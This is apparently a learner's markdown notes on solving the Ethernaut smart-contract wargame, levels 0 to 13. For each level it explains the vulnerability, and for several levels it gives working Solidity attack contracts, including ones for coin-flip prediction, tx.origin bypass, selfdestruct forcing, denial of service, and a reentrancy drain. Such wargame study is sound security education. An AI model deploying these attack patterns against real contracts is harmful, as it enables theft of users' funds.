# Ethernaut Notes
My Notes on [Ethernaut](https://ethernaut.openzeppelin.com) exercises.

# 00. Ethernaut 
* Just go through the console.
* Check out all the ABIs. 
* Password will be shown in a function. 

# 01. FallBack
* Getting the various RPC functions like the one to send Transaction. 
* Finding the diffrence between receive and fallback functions in solidity. 
* Sending ether to contract thus changing the owner to msg.sender.

# 02. Fallout
* Read the code.
* Just Calling Fal1out function will make us the owner. 

# 03. Coinflip
* Generating randomness inside a contract using globally available values or Hardcoded values is a Big NO.
* Everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private.
* Using an another contract attacker can hack that randomness.
* Here using Remix IDE we can call that contract inside an malicious contract using the same function we can crack the randomness. 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract CoinFlipAttack {

  CoinFlip public victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victimAddress) {
    victim = CoinFlip(_victimAddress);
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    victim.flip(side);
    }  
}
```
# 04. Telephone 
* ```tx.origin``` and ```msg.sender``` Shows same value only if EOA (Externally owned address) is used to call.
* By using another Smart contract to call the function we can take advantage of this contract because Smart contracts are not EOA so ```tx.origin``` changes.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TeleAttack {
    Telephone  tele;

    constructor(address _tele) {
        tele = Telephone(_tele);
    }

    function Attack(address _owner) public{
        tele.changeOwner(_owner);
    }
} 
```  
# 05. Token
* As the hint says taking the case of an classic odometer in our vehicles it has a max and min value. What happens when we go beyond that?
* It is called integer Overflow or Underflow many cyber attacks in our history not only in EVM takes advantage of this issue.
* Because uint is an non negative integer type when we transfer an amount greater than 20 our balance will have this underflow situation. 

# 06. Delegation
* As the word meaning say ```.delegatecall()``` uses memory of the orginal contract and can execute codes on the target contract.
* Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. 
* Here by creating a variable inside the console and passing it through the ```fallback``` function to call the ```pwn``` function in the target contract will make us the owner. ```var _pwned = web3.utils.keccak256("pwn()") ```
 
# 07. Force
* In solidity, for a contract to be able to receive ether, the fallback function must be marked payable or a recieve function must be there.
* However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
* Here using an another contract with some balance we can sent that balance to the target contract by calling ```selfdestruct```.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract forceit {
    Force force;

    constructor(Force _force) payable {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
    
}
```
# 08. Vault
* It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.
* Here we can access the ```_password``` by finding its memory location( Here 0 for bool and 1 for bytes32 ) and calling that location using ``` await web3.eth.getStorageAt(instance, 1, console.log) ``` which gives us the data.
* send that 32 byte data into unlock function to unlock the vault. 
* To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it.
 
# 09. King
* Here we are doing a DOS attack on the contract because even if we sent the biggest possible amount ```require(msg.value >= prize || msg.sender == owner)``` owner can't be changed and he can always be the King.
* So we send 1 wei more than the current king and use our fallback function to make a DOS. So that when it try to send ETH back we just revert it.  
```
fallback() external payable {
    revert("I'm the only KING");
}
```
# 10. Re-entrancy
* Here we can take advantage of the withdraw function because it modify our balances in the last line.
* Using our recieve function to make the withdraw function to be called in a loop before modifying our balances we can empty the funds of this target contract.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol"; // When using Remix, either get rid of the safemath import or use the url from the OZ repo. 

contract ReAttack {
    Reentrance Target;

    constructor(address payable _target) {
        Target = Reentrance(_target);
    }

    function Attack() external payable {
        Target.donate{value: address(Target).balance + 1}(address(this)); // Target.balance = 1000000000000000 
        Target.withdraw(1000000000000001); // Hardcoded the value that we sent above 
    }

    receive() external payable{
        if (address(Target).balance > 0) {
            Target.withdraw(address(Target).balance);
        }
    }

    function Sent(address payable _me) external payable {   // To sent all the funds back into our wallet
       _me.transfer(address(this).balance); 
    }
}
```

# 11. Elevator
* Here we can modify the state of the interface function ```isLastFloor``` with the help of an external contract.
* Because the function ```isLastFloor``` is an ```external``` function with no ```view``` or ```pure``` alias. 
* You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatAttack {

    bool public Top = true;
    Elevator public target;

    constructor (address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns (bool){
        Top = !Top;
        return Top;
    }

    function floor(uint _floor) public {
        target.goTo(_floor);
    }
}
```
# 12. Privacy
* "Privacy" as we saw earlier in Coinflip nothing is private in blockchain not even the private variables.
* EVM stores data as slots each slots are 32 bytes or 256 bits in size so each variables are stored on these slots according to their types.
* In this contract 6 slots are used for the variables : 1 for bool, 1 for uint256, 1 for 2*uint8 + uint16 and 3 for bytes32[3]. 
* Here in the require statement data[2] means the 3rd slot for the bytes[3] Because it is stored as 0, 1 and 2.
* We can get the data of each slots from ``` getStorageAt(...) ``` function of [web3.js](https://web3js.readthedocs.io/en/v1.8.1/web3-eth.html#getstorageat).
* Here we take the data from the 6th slot (i.e, 5th position), convert that to bytes16 and pass that to unlock function. 

# 13. Gatekeeper One 
* Here there are 3 modifiers that we need to crack in that first GateOne is same as the Telephone challange we just have to call the function from an contract.
* Second one uses an inbuilt function named ```gasleft()``` which is used to return the gas left in that contract it checks whether the ```gasleft()``` is multiple of 8191. 
* Third one looks challenging but it just takes specific bits from each inputs and checks the equality. We can see ```tx.origin``` is the key used here.
```
  contract Hack {

    function enter(address _target, uint gas) external {
        IGateKeeperOne target = IGateKeeperOne(_target);
        // Modifier 3

        // uint64 k; 
        // Req3: uint32(k) == uint16(uint160(tx.origin)));
        // Req1: uint32(k) == uint16(k);
        uint16 k16 = uint16(uint160(tx.origin));
        // Req2: uint32(k) != k;
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        
        
        bytes8 key = bytes8(k64);
        require(gas < 8191, "gas > 8191"); //Modifier 2
        require( target.enter{gas: 8191 * 10 + gas}(key), "failed");

    }
}
  ```

